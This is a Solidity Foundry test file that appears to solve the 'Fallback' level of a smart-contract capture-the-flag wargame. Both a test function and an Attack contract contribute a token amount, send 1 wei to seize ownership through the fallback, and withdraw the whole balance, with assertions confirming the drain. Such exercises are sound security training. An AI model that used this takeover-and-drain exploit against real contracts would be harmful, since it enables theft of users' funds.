// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/01_Fallback.sol";

contract FallbackTest is Test {
    Fallback instance;
    Attack attacker;
    address player;

    function setUp() public {
        instance = new Fallback();

        player = vm.addr(1);
        vm.deal(player, 4 ether);
        vm.startPrank(player);
        attacker = new Attack{value: 2 ether}(payable(address(instance)));
        vm.stopPrank();
    }

    function testattack() public {
        vm.startPrank(player);

        // send the minimum amount to become a contributor
        instance.contribute{value: 0.0001 ether}();

        // send directly to the contract 1 wei, this will allow us to become the new owner
        (bool sent, ) = address(instance).call{value: 1 wei}("");
        require(sent, "Failed to send Ether to the Fallback");

        // now that we are the owner of the contract withdraw all the funds
        instance.withdraw();

        vm.assertEq(address(instance).balance, 0);
        vm.assertEq(instance.owner(), address(player));

        vm.stopPrank();
    }

    function testattacker() public {
        attacker.attack();
        vm.assertEq(address(instance).balance, 0 ether);
        vm.assertEq(instance.owner(), address(attacker));
    }
}

contract Attack {
    Fallback instance;

    constructor(address payable fb) payable {
        instance = Fallback(fb);
    }

    function attack() public {
        // send the minimum amount to become a contributor
        instance.contribute{value: 0.0001 ether}();

        // send directly to the contract 1 wei, this will allow us to become the new owner
        (bool sent, ) = address(instance).call{value: 1 wei}("");
        require(sent, "Failed to send Ether to the Fallback");
        // now that we are the owner of the contract withdraw all the funds
        instance.withdraw();
    }

    receive() external payable {}
}
